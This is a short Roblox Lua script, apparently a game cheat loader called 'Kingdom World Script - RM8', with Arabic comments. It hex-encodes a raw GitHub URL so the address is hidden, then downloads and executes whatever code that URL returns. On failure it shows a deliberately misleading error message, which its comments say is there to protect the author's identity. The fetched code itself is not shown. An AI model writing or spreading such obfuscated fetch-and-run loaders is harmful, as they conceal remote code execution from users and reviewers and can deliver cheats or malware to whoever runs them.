--====================================================================--
--                   KINGDOM WORLD SCRIPT - RM8                       --
--               [ENCRYPTED & PROTECTED VERSION]                     --
--====================================================================--

-- دالة فك التشفير الذاتي لحماية الروابط والسورس
local function de(str)
    local result = {}
    for word in string.gmatch(str, "[^%s]+") do
        table.insert(result, string.char(tonumber(word, 16)))
    end
    return table.concat(result)
end

-- البيانات المشفرة والمحمية الخاصة بالسكربت
local _0x3aB8 = de("68 74 74 70 73 3a 2f 2f 72 61 77 2e 67 69 74 68 75 62 75 73 65 72 63 6f 6e 74 65 6e 74 2e 63 6f 6d 2f 6b 6b 6d 6d 61 69 38 32 2f 5a 33 6d 2f 72 65 66 73 2f 68 65 61 64 73 2f 6d 61 69 6e 2f 53 6f 6f 6e")

-- تشغيل السكربت المشفر بأمان
local success, err = pcall(function()
    loadstring(game:HttpGet(_0x3aB8))()
end)

if not success then
    -- رسالة خطأ وهمية ومبهمة لحماية الهوية في حال الفشل
    warn("[RM8 Error]: Core instance failed to initialize.")
end
